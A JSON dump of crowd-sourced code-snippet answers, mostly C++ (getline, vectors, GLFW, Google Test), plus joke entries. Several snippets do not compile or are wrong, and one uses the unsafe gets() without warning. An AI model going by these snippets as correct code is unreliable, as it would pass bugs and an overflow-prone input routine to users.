    "id": 2169,
    "keyword": null,
    "link": null,
    "title": " get index of value c++",
    "description": "vector<int> arr = { 6, 3, 5, 2, 8 }; vector<int>::iterator itr = std::find(arr.begin(), arr.end(), elem);  if (itr != end(arr)) { \tcout << \"Element \" << elem << \" is present at index \" << distance(arr, itr) << \" in the given array\"; } else { \tcout << \"Element is not present in the given array\"; }\n",
    "reg_date": "2021-10-12T11:40:26.000Z"
  },
  {
    "id": 2170,
    "keyword": null,
    "link": null,
    "title": " get input from command line and run command in c++",
    "description": "> args my_file.txt Line fab Line fab Line edc\n",
    "reg_date": "2021-10-12T11:40:26.000Z"
  },
  {
    "id": 2171,
    "keyword": null,
    "link": null,
    "title": " get last element of stack c++",
    "description": "vector<int> vec; vec.push_back(0); vec.push_back(1); int last_element = vec.back(); int also_last_element = vec[vec.size() - 1]; \n// stack::top #include <iostream>       // std::cout #include <stack>          // std::stack  int main () {   std::stack<int> mystack;    mystack.push(10);   mystack.push(20);   // .top() gets the last/top element of stack c++   mystack.top() -= 5;    std::cout << \"mystack.top() is now \" << mystack.top() << '\\n';    return 0; }\n",
    "reg_date": "2021-10-12T11:40:27.000Z"
  },
  {
    "id": 2172,
    "keyword": null,
    "link": null,
    "title": " get line C++",
    "description": "// extract to string #include <iostream> #include <string>  int main () {   std::string name;    std::cout << \"Please, enter your full name: \";   std::getline (std::cin,name);   std::cout << \"Hello, \" << name << \"!\\n\";    return 0; }\n//getline allows for multi word input including spaces ex. \"Jim Barens\" #include <iostream> #include <string>  int main()  {   string namePerson{};     // creating string   getline(cin, namePerson);// using getline for user input   std::cout << namePerson; // output string namePerson }\n",
    "reg_date": "2021-10-12T11:40:27.000Z"
  },
  {
    "id": 2173,
    "keyword": null,
    "link": null,
    "title": " get map values c++",
    "description": "template<typename TK, typename TV> std::vector<TV> extract_values(std::map<TK, TV> const& input_map) {   std::vector<TV> retval;   for (auto const& element : input_map) {     retval.push_back(element.second);   }   return retval; }\n",
    "reg_date": "2021-10-12T11:40:27.000Z"
  },
  {
    "id": 2174,
    "keyword": null,
    "link": null,
    "title": " get min and max element index from vector c++",
    "description": "int maxElementIndex = std::max_element(v.begin(),v.end()) - v.begin(); int maxElement = *std::max_element(v.begin(), v.end());  int minElementIndex = std::min_element(v.begin(),v.end()) - v.begin(); int minElement = *std::min_element(v.begin(), v.end());\ntemplate <typename T, size_t N> const T* mybegin(const T (&a)[N]) { return a; }     template <typename T, size_t N> const T* myend  (const T (&a)[N]) { return a+N; }\n",
    "reg_date": "2021-10-12T11:40:27.000Z"
  },
  {
    "id": 2175,
    "keyword": null,
    "link": null,
    "title": " get nth fibonacci c++",
    "description": "#include <bits/stdc++.h> using namespace std; #define ll long long; const ll mod =1e9+7; unordered_map <ll,ll> f;  ll fib(ll n) { \tif(n < 2) return 1; \tif (f.find(n) != f.end())  \t\treturn f[n]; \tf[n] = (fib((n+1)/2)*fib(n/2) + fib((n-1)/2)*fib((n-2)/2)) % mod; \treturn f[n]; } main() { \tint t; cin >> t; \twhile ( t--) { \t\tll n; \t\tcin >> n; \t\tcout << fib(n-1) << \"\\n\"; \t} } /* Input         Output 3            2             1 6             8 20            6765 */\n",
    "reg_date": "2021-10-12T11:40:27.000Z"
  },
  {
    "id": 2176,
    "keyword": null,
    "link": null,
    "title": " get number round off to two decimal places c++",
    "description": "value = round( value * 100.0 ) / 100.0; // 2 decimal places value = round( value * 1000.0 ) / 1000.0; // 3 decimal places\n float a,b,c,d,sum;   cin>>a>>b>>c>>d; // reading decimal values  sum=(a*b*c*d);  sum=round(sum*100)/100; // here it is for 2 decimal points  if((float)sum < (float) 9.58)   cout<<\"YES\\n\"; else   cout<<\"NO\\n\";   \ndouble d = 0.12345; std::cout.precision(2); // for accuracy to 2 decimal places  std::cout << d << std::endl; // 0.12\n",
    "reg_date": "2021-10-12T11:40:27.000Z"
  },
  {
    "id": 2177,
    "keyword": null,
    "link": null,
    "title": " get player pawn",
    "description": "//file to include #include \"Kismet/GameplayStatics.h\"  //Syntax static APawn * GetPlayerPawn(const UObject * WorldContextObject, int32 PlayerIndex);  //ExampleCode APawn* PlayerPawn = UGameplayStatics::GetPlayerPawn(GetWorld(), 0); //\t\t\t\t\t\t\t\tthis is a reference to world  | This is the index of player which you want. In this case  have written 0 that means the first player //For more information vist https://docs.unrealengine.com/en-US/API/Runtime/Engine/Kismet/UGameplayStatics/GetPlayerPawn/index.html\t\t\t\t\t\t\t\t\t\t\t\n",
    "reg_date": "2021-10-12T11:40:28.000Z"
  },
  {
    "id": 2178,
    "keyword": null,
    "link": null,
    "title": " get rest of a stringstream c++",
    "description": "#include <iostream> #include <sstream>  using namespace std;  int main() {         stringstream ss(\"abc gg rrr ff\");         string s1, s2;         ss >> s1;         getline(ss, s2); //get rest of the string!         cout << s1 << endl;         cout << s2 << endl;         return 0; } \n",
    "reg_date": "2021-10-12T11:40:28.000Z"
  },
  {
    "id": 2179,
    "keyword": null,
    "link": null,
    "title": " get spaces in cin c++",
    "description": "int main() {    char a[10];    for(int i = 0; i < 10; i++)    {        cin>>a[i];        if(a[i] == ' ')           cout<<\"It is a space!!!\"<<endl;    }    return 0; } \n",
    "reg_date": "2021-10-12T11:40:28.000Z"
  },
  {
    "id": 2180,
    "keyword": null,
    "link": null,
    "title": " get the element at an index list c++",
    "description": "std::list<std::string>::iterator it = listOfStrs.begin();     // Advance the iterator by 2 positions for a list of string named listOfStrs std::advance(it, 2);\n",
    "reg_date": "2021-10-12T11:40:28.000Z"
  },
  {
    "id": 2181,
    "keyword": null,
    "link": null,
    "title": " get the first element of array c++",
    "description": "int arr = [1,2,3,4]; cout << arr[0];\t\t\t//printing the first element of the array arr\n#include <array> std::array<int, 5> a {1, 2, 3, 4, 5}; int i = a[a.size() - 1]; // The last variable stored in i\n",
    "reg_date": "2021-10-12T11:40:28.000Z"
  },
  {
    "id": 2182,
    "keyword": null,
    "link": null,
    "title": " get the last element of an array c++",
    "description": "int arr={1,2,3,4,5,6}; int length=sizeof(arr)/sizeof(int); int lastElement=aar[length-1];\n#include<iostream> /*To get the last element of the array we first get the size      of the array by using sizeof().  Unfortunately, this gives      us the size of the array in bytes.  To fix this, we divide     the size (in bytes) by the size of the data type in the array.     In our case, this would be int, so we divide sizeof(array)      by sizeof(int).  Since arrays  start from 0 and not 1 we      subtract one to get the last element.     -yegor*/ int array[5] = { 1, 2, 3, 4, 5 }; printf(\"Last Element of Array: %d\", array[(sizeof(array)/sizeof(int))-1]);\nvector<int> vec; vec.push_back(0); vec.push_back(1); int last_element = vec.back(); int also_last_element = vec[vec.size() - 1]; \n// C++ Program to print first and last element in an array #include <iostream> using namespace std; int main() { \tint arr[] = { 4, 5, 7, 13, 25, 65, 98 }; \tint f, l, n; \tn = sizeof(arr) / sizeof(arr[0]); \tf = arr[0]; \tl = arr[n - 1]; \tcout << \"First element: \" << f << endl; \tcout << \"Last element: \" << l << endl; \treturn 0; } \n#include <array> std::array<int, 5> a {1, 2, 3, 4, 5}; int i = a[a.size() - 1]; // The last variable stored in i\n",
    "reg_date": "2021-10-12T11:40:29.000Z"
  },
  {
    "id": 2183,
    "keyword": null,
    "link": null,
    "title": " get thread id c++",
    "description": "std::this_thread::get_id();\n",
    "reg_date": "2021-10-12T11:40:29.000Z"
  },
  {
    "id": 2184,
    "keyword": null,
    "link": null,
    "title": " get type of an object c++",
    "description": "//get type of a typeid(a).name()\n",
    "reg_date": "2021-10-12T11:40:29.000Z"
  },
  {
    "id": 2185,
    "keyword": null,
    "link": null,
    "title": " get values from a vector of vectors c++",
    "description": "#include <iostream> #include <vector> using namespace std;    int main() {     vector<vector<int> > buff;      for(int i = 0; i < 10; i++)     {         vector<int> temp; // create an array, don't work directly on buff yet.         for(int j = 0; j < 10; j++)             temp.push_back(i);            buff.push_back(temp); // Store the array in the buffer     }      for(int i = 0; i < buff.size(); ++i)     {         for(int j = 0; j < buff[i].size(); ++j)             cout << buff[i][j];         cout << endl;     }      return 0; }\n// Initializing vector with values      vector<int> vect1{1, 2, 3, 4};         // Declaring another vector      vector<int> vect2;         // Copying vector by assign function      vect2.assign(vect1.begin(), vect1.end()); \n",
    "reg_date": "2021-10-12T11:40:29.000Z"
  },
  {
    "id": 2186,
    "keyword": null,
    "link": null,
    "title": " get vector input from string in c++",
    "description": "vector<int> getVectorInput(string s){     string res=\"\";     vector<int> arr;     for(auto e : s){         if(e==' '){             if(res.size()!=0)             arr.push_back(stoi(res));             res=\"\";             continue;         }         res+=e;     }     if(res.size()!=0)         arr.push_back(stoi(res));     return arr; }\n",
    "reg_date": "2021-10-12T11:40:29.000Z"
  },
  {
    "id": 2187,
    "keyword": null,
    "link": null,
    "title": " get window position",
    "description": "void GetWindowPos( int *x, int *y ) {     RECT rect = { NULL };     if( GetWindowRect( GetConsoleWindow(), &rect ) ) {         *x = rect.left;         *y = rect.top;     } } \n",
    "reg_date": "2021-10-12T11:40:29.000Z"
  },
  {
    "id": 2188,
    "keyword": null,
    "link": null,
    "title": " getch() c++",
    "description": "#include<iostream.h> #include<conio.h>  void main() { int a=10, b=20; int sum=0; clrscr();  // use clrscr() after variable declaration sum=a+b; cout<<\"Sum: \"<<sum; getch(); }\n#include <conio.h> int getch();\n",
    "reg_date": "2021-10-12T11:40:29.000Z"
  },
  {
    "id": 2189,
    "keyword": null,
    "link": null,
    "title": " getch c++ library",
    "description": "#include<iostream.h> #include<conio.h>  void main() { int a=10, b=20; int sum=0; clrscr();  // use clrscr() after variable declaration sum=a+b; cout<<\"Sum: \"<<sum; getch(); }\n#include <conio.h> int getch();\n",
    "reg_date": "2021-10-12T11:40:29.000Z"
  },
  {
    "id": 2190,
    "keyword": null,
    "link": null,
    "title": " getline()",
    "description": "#include <iostream> #include <string> string str; getline(cin, str); //str contains line\n// extract to string #include <iostream> #include <string>  int main () {   std::string name;    std::cout << \"Please, enter your full name: \";   std::getline (std::cin,name);   std::cout << \"Hello, \" << name << \"!\\n\";    return 0; }\n//getline allows for multi word input including spaces ex. \"Jim Barens\" #include <iostream> #include <string>  int main()  {   string namePerson{};     // creating string   getline(cin, namePerson);// using getline for user input   std::cout << namePerson; // output string namePerson }\nSensorsFile::SensorsFile(const string fname, bool verbose)       : Sensors(fname, verbose){        // BEGIN: F2       ifstream inFile(fname);     if (!inFile) {         throw runtime_error(\"Could not read from file \" + fname + '\\n');     }        string line;     // auto dummy;      unsigned int timestep;     string dam;  int inflow;     int outflow;     getline(inFile, line); // Denne for &aring; fjerne f&oslash;rste linje av filen!        // Her er det viktig &aring; huske at vi m&aring; fjerne f&oslash;rste linje, da denne kun er til info.     while (getline (inFile, line)) {         // stringstream ss;         string dummy;           getline(inFile, dummy, ',');         timestep = stoi(dummy);              getline(inFile, dummy, ',');         dam = dummy;              getline(inFile, dummy, ',');        inflow = stoi(dummy);              getline(inFile, dummy, ',');         outflow = stoi(dummy);              insert_reading(timestep, dam, inflow, outflow);     }       inFile.close();        // END: F2   }\nsize_t getline(char **lineptr, size_t *n, FILE *stream);Copy\nistream& getline (istream& is, string& str);\n",
    "reg_date": "2021-10-12T11:40:29.000Z"
  },
  {
    "id": 2191,
    "keyword": null,
    "link": null,
    "title": " getline(cin string) not working",
    "description": "//Using cin.clear() to ignore any trailing newline character string str; cin.clear(); getline(cin, str);\n",
    "reg_date": "2021-10-12T11:40:29.000Z"
  },
  {
    "id": 2192,
    "keyword": null,
    "link": null,
    "title": " getline",
    "description": "// extract to string #include <iostream> #include <string>  int main () {   std::string name;    std::cout << \"Please, enter your full name: \";   std::getline (std::cin,name);   std::cout << \"Hello, \" << name << \"!\\n\";    return 0; }\n//getline allows for multi word input including spaces ex. \"Jim Barens\" #include <iostream> #include <string>  int main()  {   string namePerson{};     // creating string   getline(cin, namePerson);// using getline for user input   std::cout << namePerson; // output string namePerson }\nSensorsFile::SensorsFile(const string fname, bool verbose)       : Sensors(fname, verbose){        // BEGIN: F2       ifstream inFile(fname);     if (!inFile) {         throw runtime_error(\"Could not read from file \" + fname + '\\n');     }        string line;     // auto dummy;      unsigned int timestep;     string dam;  int inflow;     int outflow;     getline(inFile, line); // Denne for &aring; fjerne f&oslash;rste linje av filen!        // Her er det viktig &aring; huske at vi m&aring; fjerne f&oslash;rste linje, da denne kun er til info.     while (getline (inFile, line)) {         // stringstream ss;         string dummy;           getline(inFile, dummy, ',');         timestep = stoi(dummy);              getline(inFile, dummy, ',');         dam = dummy;              getline(inFile, dummy, ',');        inflow = stoi(dummy);              getline(inFile, dummy, ',');         outflow = stoi(dummy);              insert_reading(timestep, dam, inflow, outflow);     }       inFile.close();        // END: F2   }\nistream& getline (istream& is, string& str);\n",
    "reg_date": "2021-10-12T11:40:30.000Z"
  },
  {
    "id": 2193,
    "keyword": null,
    "link": null,
    "title": " getline cin is being skipped",
    "description": "// The reason getline is not getting user input is because // getline does not remove new lines from the buffer. // Before calling getline(), use cin.ignore() to clear the buffer  std::cin.ignore(); getline(std::cin, str);\n",
    "reg_date": "2021-10-12T11:40:30.000Z"
  },
  {
    "id": 2194,
    "keyword": null,
    "link": null,
    "title": " getline cpp",
    "description": "// extract to string #include <iostream> #include <string>  int main () {   std::string name;    std::cout << \"Please, enter your full name: \";   std::getline (std::cin,name);   std::cout << \"Hello, \" << name << \"!\\n\";    return 0; }\n//getline allows for multi word input including spaces ex. \"Jim Barens\" #include <iostream> #include <string>  int main()  {   string namePerson{};     // creating string   getline(cin, namePerson);// using getline for user input   std::cout << namePerson; // output string namePerson }\n",
    "reg_date": "2021-10-12T11:40:30.000Z"
  },
  {
    "id": 2195,
    "keyword": null,
    "link": null,
    "title": " getline of file C++",
    "description": "ifstream inFile; string name; int age;  inFile.open(\"file.txt\");  getline(inFile, name);  inFile >> age;   cout << name << endl; cout << age << endl;    inFile.close();     \n",
    "reg_date": "2021-10-12T11:40:30.000Z"
  },
  {
    "id": 2196,
    "keyword": null,
    "link": null,
    "title": " getline trong c++",
    "description": "//getline allows for multi word input including spaces ex. \"Jim Barens\" #include <iostream> #include <string>  int main()  {   string namePerson{};     // creating string   getline(cin, namePerson);// using getline for user input   std::cout << namePerson; // output string namePerson }\ngetline(std::cin,<bien>); \n",
    "reg_date": "2021-10-12T11:40:30.000Z"
  },
  {
    "id": 2197,
    "keyword": null,
    "link": null,
    "title": " getline vs cin.getline",
    "description": "getline(cin, variable_name, '\\n'); \n",
    "reg_date": "2021-10-12T11:40:30.000Z"
  },
  {
    "id": 2198,
    "keyword": null,
    "link": null,
    "title": " gets in cpp",
    "description": "#include <iostream> #include <cstdio>  using namespace std;  int main() {     char str[100];     cout << \"Enter a string: \";     gets(str);     cout << \"You entered: \" << str;          return 0; }\nstdio\n",
    "reg_date": "2021-10-12T11:40:30.000Z"
  },
  {
    "id": 2199,
    "keyword": null,
    "link": null,
    "title": " getting a random letter in c++",
    "description": "char cch = 'a' + rand()&;\n    char c;     int r;      srand (time(NULL));    // initialize the random number generator     for (i=0; i<num; i++)     {    r = rand() % 26;   // generate a random number           c = 'a' + r;            // Convert to a character from a-z           cout << c;     }\n",
    "reg_date": "2021-10-12T11:40:30.000Z"
  },
  {
    "id": 2200,
    "keyword": null,
    "link": null,
    "title": " gfg bottom view of tree",
    "description": "/* This is not the entire code. It's just the function which implements     bottom view. You need to write required code. */  // Obj class is used to store node with it's distance from parent. class Obj {     public:         Node *root;         int dis;          Obj(Node *node, int dist)         {             root = node;             dis = dist;         } };  // bottom view logic below. void bottomView(Node *root) {     queue<Obj*> q;     q.push(new Obj(root, 0));     map<int,int> m;      while(!q.empty())     {         Obj *ob = q.front();         q.pop();          m[ob->dis] = ob->root->data;          if(ob->root->left != NULL)             q.push(new Obj(ob->root->left, ob->dis-1));          if(ob->root->right != NULL)             q.push(new Obj(ob->root->right, ob->dis+1));     }      for(auto it=m.begin(); it!=m.end(); it++)         cout << it->second << \"\\t\";      cout << endl; }\n",
    "reg_date": "2021-10-12T11:40:30.000Z"
  },
  {
    "id": 2201,
    "keyword": null,
    "link": null,
    "title": " gfg cyclic array rotation",
    "description": "// C program to rotate an array cyclically  #include <stdio.h>  void rightRotateByOne(int arr[], int n) //function for cyclically rotating an array once {    int x = arr[n-1], i;    for (i = n-1; i > 0; i--)       arr[i] = arr[i-1];    arr[0] = x; }  int main() {int t; scanf(\"%d\",&t);//number of test cases int p; for(p=0;p<t;p++){     int n,i,k;     scanf(\"%d %d\",&n,&k); // n--> size of array ; k--> number of rotations     int arr[n];     k=k%n;     for(i=0;i<n;i++){         scanf(\"%d\",&arr[i]);     } int j;  for(j=0;j<k;j++) //cyclically rotating an array k times {rightRotateByOne(arr, n);}       for (i = 0; i < n; i++){         printf(\"%d \", arr[i]);}         printf(\"\\n\");}      return 0; } \n# include <iostream>  using namespace std;   void rotate(int arr[], int n)  {  \tint last = arr[n - 1], i;  \tfor (i = n - 1; i > 0; i--)  \tarr[i] = arr[i - 1];  \tarr[0] = last;  }    int main()  {  \tint arr[100], i;  \tint n, turns;  \tcin >> n;  \tfor(i=0;i<n;i++){ \t\tscanf(\"%d\", &arr[i]); \t}      \tcin >> turns;  \twhile(turns>=1){ \t\trotate(arr,n); \t\tturns--; \t}  \tfor(i=0;i<n;i++){ \t\tcout << arr[i] << \" \"; \t}  \treturn 0;  }   \n",
    "reg_date": "2021-10-12T11:40:30.000Z"
  },
  {
    "id": 2202,
    "keyword": null,
    "link": null,
    "title": " gfg left view of tree",
    "description": "/* This is not the entire code. It's just the function which implements     bottom view. You need to write required code. */  // Obj class is used to store node with it's distance from parent. class Obj {     public:         Node *root;         int dis; // distance from parent node. distance of root node will be 0.          Obj(Node *node, int dist)         {             root = node;             dis = dist;         } };  // function to print left view of tree. void leftView(Node *root) {     queue<Obj*> q;     q.push(new Obj(root, 0));     map<int,int> m;      while(!q.empty())     {         Obj *ob = q.front();         q.pop();          if(m.find(ob->dis) == m.end())             m[ob->dis] = ob->root->data;          if(ob->root->left != NULL)             q.push(new Obj(ob->root->left, ob->dis+1));          if(ob->root->right != NULL)             q.push(new Obj(ob->root->right, ob->dis+1));     }      for(auto it=m.begin(); it!=m.end(); it++)         cout << it->second << \"\\t\";      cout << endl; }\n",
    "reg_date": "2021-10-12T11:40:31.000Z"
  },
  {
    "id": 2203,
    "keyword": null,
    "link": null,
    "title": " gfg right view of tree",
    "description": "/* This is not the entire code. It's just the function which implements     bottom view. You need to write required code. */  // Obj class is used to store node with it's distance from parent. class Obj {     public:         Node *root;         int dis; // distance from parent node. distance of root node will be 0.          Obj(Node *node, int dist)         {             root = node;             dis = dist;         } };  // function to print right view. void rightView(Node *root) {     queue<Obj*> q;     q.push(new Obj(root, 0));     map<int,int> m;      while(!q.empty())     {         Obj *ob = q.front();         q.pop();          m[ob->dis] = ob->root->data;          if(ob->root->left != NULL)             q.push(new Obj(ob->root->left, ob->dis+1));          if(ob->root->right != NULL)             q.push(new Obj(ob->root->right, ob->dis+1));     }      for(auto it=m.begin(); it!=m.end(); it++)         cout << it->second << \"\\t\";      cout << endl; }\n",
    "reg_date": "2021-10-12T11:40:31.000Z"
  },
  {
    "id": 2204,
    "keyword": null,
    "link": null,
    "title": " gfg top view of tree",
    "description": "/* This is not the entire code. It's just the function which implements     bottom view. You need to write required code. */  // Obj class is used to store node with it's distance from parent. class Obj {     public:         Node *root;         int dis; // distance from parent node. distance of root node will be 0.          Obj(Node *node, int dist)         {             root = node;             dis = dist;         } };  void topView(Node *root) {     queue<Obj*> q;     q.push(new Obj(root, 0));     map<int,int> m;      while(!q.empty())     {         Obj *ob = q.front();         q.pop(); \t\t       \t/* insert node of unique distance from parent node. ignore repitation             of distance. */         if(m.find(ob->dis) == m.end())             m[ob->dis] = ob->root->data;          if(ob->root->left != NULL)             q.push(new Obj(ob->root->left, ob->dis-1));          if(ob->root->right != NULL)             q.push(new Obj(ob->root->right, ob->dis+1));     }    \t// printing nodes.     for(auto it=m.begin(); it!=m.end(); it++)         cout << it->second << \"\\t\";      cout << endl; }\n",
    "reg_date": "2021-10-12T11:40:31.000Z"
  },
  {
    "id": 2205,
    "keyword": null,
    "link": null,
    "title": " gfgdf",
    "description": "Access-Control-Allow-Origin: * Access-Control-Allow-Origin: <origin> Access-Control-Allow-Origin: null \n",
    "reg_date": "2021-10-12T11:40:31.000Z"
  },
  {
    "id": 2206,
    "keyword": null,
    "link": null,
    "title": " git branch in my bash prompt",
    "description": "parse_git_branch() {      git branch 2> /dev/null | sed -e '/^[^*]/d' -e 's/* \\(.*\\)/ (\\1)/' } export PS1=\"\\u@\\h \\[\\033[32m\\]\\w\\[\\033[33m\\]\\$(parse_git_branch)\\[\\033[00m\\] $ \"\n",
    "reg_date": "2021-10-12T11:40:31.000Z"
  },
  {
    "id": 2207,
    "keyword": null,
    "link": null,
    "title": " glUniform bool",
    "description": "glUniform1i(uniformLocation, true);\n",
    "reg_date": "2021-10-12T11:40:31.000Z"
  },
  {
    "id": 2208,
    "keyword": null,
    "link": null,
    "title": " gl draw line rectangle",
    "description": "glBegin(GL_LINE_LOOP) ;     glVertex3f(0.0, 0.0, 0.0);     glVertex3f(0.0, 0.5, 0.0);     glVertex3f(0.5, 0.5, 0.0);     glVertex3f(0.5, 0.0, 0.0); glEnd() ; \n",
    "reg_date": "2021-10-12T11:40:31.000Z"
  },
  {
    "id": 2209,
    "keyword": null,
    "link": null,
    "title": " glfw",
    "description": "#include <GLFW/glfw3.h>  int main(void) {     GLFWwindow* window;      /* Initialize the library */     if (!glfwInit())         return -1;      /* Create a windowed mode window and its OpenGL context */     window = glfwCreateWindow(640, 480, \"Hello World\", NULL, NULL);     if (!window)     {         glfwTerminate();         return -1;     }      /* Make the window's context current */     glfwMakeContextCurrent(window);      /* Loop until the user closes the window */     while (!glfwWindowShouldClose(window))     {         /* Render here */         glClear(GL_COLOR_BUFFER_BIT);          /* Swap front and back buffers */         glfwSwapBuffers(window);          /* Poll for and process events */         glfwPollEvents();     }      glfwTerminate();     return 0; }\n",
    "reg_date": "2021-10-12T11:40:31.000Z"
  },
  {
    "id": 2210,
    "keyword": null,
    "link": null,
    "title": " glfw draw line",
    "description": "      glColor3f(1.0,0.0,0.0); // red x         glBegin(GL_LINES);         // x aix               glVertex3f(-4.0, 0.0f, 0.0f);         glVertex3f(4.0, 0.0f, 0.0f);               glVertex3f(4.0, 0.0f, 0.0f);         glVertex3f(3.0, 1.0f, 0.0f);               glVertex3f(4.0, 0.0f, 0.0f);         glVertex3f(3.0, -1.0f, 0.0f);         glEnd();               // y          glColor3f(0.0,1.0,0.0); // green y         glBegin(GL_LINES);         glVertex3f(0.0, -4.0f, 0.0f);         glVertex3f(0.0, 4.0f, 0.0f);               glVertex3f(0.0, 4.0f, 0.0f);         glVertex3f(1.0, 3.0f, 0.0f);               glVertex3f(0.0, 4.0f, 0.0f);         glVertex3f(-1.0, 3.0f, 0.0f);         glEnd();               // z          glColor3f(0.0,0.0,1.0); // blue z         glBegin(GL_LINES);         glVertex3f(0.0, 0.0f ,-4.0f );         glVertex3f(0.0, 0.0f ,4.0f );                     glVertex3f(0.0, 0.0f ,4.0f );         glVertex3f(0.0, 1.0f ,3.0f );               glVertex3f(0.0, 0.0f ,4.0f );         glVertex3f(0.0, -1.0f ,3.0f );         glEnd();\n",
    "reg_date": "2021-10-12T11:40:31.000Z"
  },
  {
    "id": 2211,
    "keyword": null,
    "link": null,
    "title": " glfw example window",
    "description": "#include <GLFW/glfw3.h>  int main(void) {     GLFWwindow* window;      /* Initialize the library */     if (!glfwInit())         return -1;      /* Create a windowed mode window and its OpenGL context */     window = glfwCreateWindow(640, 480, \"Hello World\", NULL, NULL);     if (!window)     {         glfwTerminate();         return -1;     }      /* Make the window's context current */     glfwMakeContextCurrent(window);      /* Loop until the user closes the window */     while (!glfwWindowShouldClose(window))     {         /* Render here */         glClear(GL_COLOR_BUFFER_BIT);          /* Swap front and back buffers */         glfwSwapBuffers(window);          /* Poll for and process events */         glfwPollEvents();     }      glfwTerminate();     return 0; }\n",
    "reg_date": "2021-10-12T11:40:31.000Z"
  },
  {
    "id": 2212,
    "keyword": null,
    "link": null,
    "title": " glfw initialize in c++",
    "description": "#include <GLFW/glfw3.h>  int main(void) {     GLFWwindow* window;      /* Initialize the library */     if (!glfwInit())         return -1;      /* Create a windowed mode window and its OpenGL context */     window = glfwCreateWindow(640, 480, \"Hello World\", NULL, NULL);     if (!window)     {         glfwTerminate();         return -1;     }      /* Make the window's context current */     glfwMakeContextCurrent(window);      /* Loop until the user closes the window */     while (!glfwWindowShouldClose(window))     {         /* Render here */         glClear(GL_COLOR_BUFFER_BIT);          /* Swap front and back buffers */         glfwSwapBuffers(window);          /* Poll for and process events */         glfwPollEvents();     }      glfwTerminate();     return 0; }\n",
    "reg_date": "2021-10-12T11:40:32.000Z"
  },
  {
    "id": 2213,
    "keyword": null,
    "link": null,
    "title": " glm has no member value ptr",
    "description": "instead of  #include \"glm/glm.hpp\" use #include \"glm/ext.hpp\"\n",
    "reg_date": "2021-10-12T11:40:32.000Z"
  },
  {
    "id": 2214,
    "keyword": null,
    "link": null,
    "title": " glm multiply vector by scalar",
    "description": "glm::vec3 a = glm::vec3(2,2,2) * 0.5f;// Should be a float scalar\n",
    "reg_date": "2021-10-12T11:40:32.000Z"
  },
  {
    "id": 2215,
    "keyword": null,
    "link": null,
    "title": " glut keyboard input",
    "description": "void keyboard(unsigned char key, int x, int y) { \n",
    "reg_date": "2021-10-12T11:40:32.000Z"
  },
  {
    "id": 2216,
    "keyword": null,
    "link": null,
    "title": " gmod hitman job code",
    "description": "TEAM_TERRORL = DarkRP.createJob(\"Terrorist Leader\", {     color = Color(255, 140, 0, 255),     model = \"models/codplayers/opfor4.mdl\",     description = [[]],     weapons = {\"m9k_ak47\", \"m9k_ied_detonator\", \"m9k_suicide_bomb\", \"m9k_proxy_mine\", \"m9k_rpg7\"}     command = \"terroristl\",     max = 1,     salary = 150,     admin = 0,     vote = true,     hasLicense = false,     category = \"Citizens\", })\n",
    "reg_date": "2021-10-12T11:40:32.000Z"
  },
  {
    "id": 2217,
    "keyword": null,
    "link": null,
    "title": " google",
    "description": "Its google, what did you expect?\nThis is Google\nWell done. You just googled Google. nice\nwww.google.co.za\n//Imagine typing google into google. Go learn C#.\nYou are using it right now, why did you search for it\nPlease stop doing this to yourself\ngoogling google with google\nGoogle is a tech company, good for googling code.\nummmmm grandma?\n",
    "reg_date": "2021-10-12T11:40:32.000Z"
  },
  {
    "id": 2218,
    "keyword": null,
    "link": null,
    "title": " google dich",
    "description": "CREATE TABLE ACCOUNT (ID INTEGET PRIMARY KEY, NAME TEXT NOT NULL, PASSWORD TEXT NOT NULL); INSERT INTO ACCOUNT VALUES (?,'admin','admin'); SELECT * FROM ACCOUNT; \nThe google is the most and most perfect company in the world \nTheres a high chance your using google or chrome as your web browser.\n",
    "reg_date": "2021-10-12T11:40:32.000Z"
  },
  {
    "id": 2219,
    "keyword": null,
    "link": null,
    "title": " google pdf iframe viwer",
    "description": "<iframe src=\"https://docs.google.com/gview?url={magical url that works}\"></iframe>\n",
    "reg_date": "2021-10-12T11:40:32.000Z"
  },
  {
    "id": 2220,
    "keyword": null,
    "link": null,
    "title": " google snake game",
    "description": "s n a k e\nsnek \n",
    "reg_date": "2021-10-12T11:40:32.000Z"
  },
  {
    "id": 2221,
    "keyword": null,
    "link": null,
    "title": " google spreadsheets add two strings",
    "description": "CONCAT(\"String1\", \"String2\") //or CONCATENATE(\"String1\", \"String2\", \"String3\") //CONCATENATE allows more than 2 strings.\n",
    "reg_date": "2021-10-12T11:40:32.000Z"
  },
  {
    "id": 2222,
    "keyword": null,
    "link": null,
    "title": " google test assert eq float",
    "description": "ASSERT_NEAR(13.45, 13.45, 0.01); // third member is precision (for floats)\n",
    "reg_date": "2021-10-12T11:40:33.000Z"
  },
  {
    "id": 2223,
    "keyword": null,
    "link": null,
    "title": " google test assert exception",
    "description": "#include <stdexcept> #include \"gtest/gtest.h\"  struct foo {     int bar(int i) {         if (i > 100) {             throw std::out_of_range(\"Out of range\");         }         return i;     } };  TEST(foo_test,out_of_range) {     foo f;     try {         f.bar(111);         FAIL() << \"Expected std::out_of_range\";     }     catch(std::out_of_range const & err) {         EXPECT_EQ(err.what(),std::string(\"Out of range\"));     }     catch(...) {         FAIL() << \"Expected std::out_of_range\";     } }\n",
    "reg_date": "2021-10-12T11:40:33.000Z"
  },
  {
    "id": 2224,
    "keyword": null,
    "link": null,
    "title": " google test assert stdout",
    "description": "testing::internal::CaptureStdout(); std::cout << \"My test\"; std::string output = testing::internal::GetCapturedStdout();\n",
    "reg_date": "2021-10-12T11:40:33.000Z"
  },
  {
    "id": 2225,
    "keyword": null,
    "link": null,
    "title": " google test assert throw",
    "description": "#include <stdexcept> #include \"gtest/gtest.h\"  struct foo {     int bar(int i) {         if (i > 100) {             throw std::out_of_range(\"Out of range\");         }         return i;     } };  TEST(foo_test,out_of_range) {     foo f;     try {         f.bar(111);         FAIL() << \"Expected std::out_of_range\";     }     catch(std::out_of_range const & err) {         EXPECT_EQ(err.what(),std::string(\"Out of range\"));     }     catch(...) {         FAIL() << \"Expected std::out_of_range\";     } }\n",
    "reg_date": "2021-10-12T11:40:33.000Z"
  },
  {
    "id": 2226,
    "keyword": null,
    "link": null,
    "title": " google translate",
    "description": "upvote if you feel terrible\nlife is easier with google translate ;)\nnot cheating on spanish hell yea\n$after = preg_replace('/[^\\w\\s]+/u','' , $before);   // remove حرکت php word حذف حرکات و اعراب در پی اچ پی\nwhat are you doing here?\nAls je vertalen opzoekt kan je woorden en zinnen vertalen. Maar let op!!!! Google vertaler is niet zuiver onhou dat goed!!\nGlad to hear that I'm not the only german, having english problems ;)\nno cheating guys\nuse deepl.com instead\nCheating in french?\n",
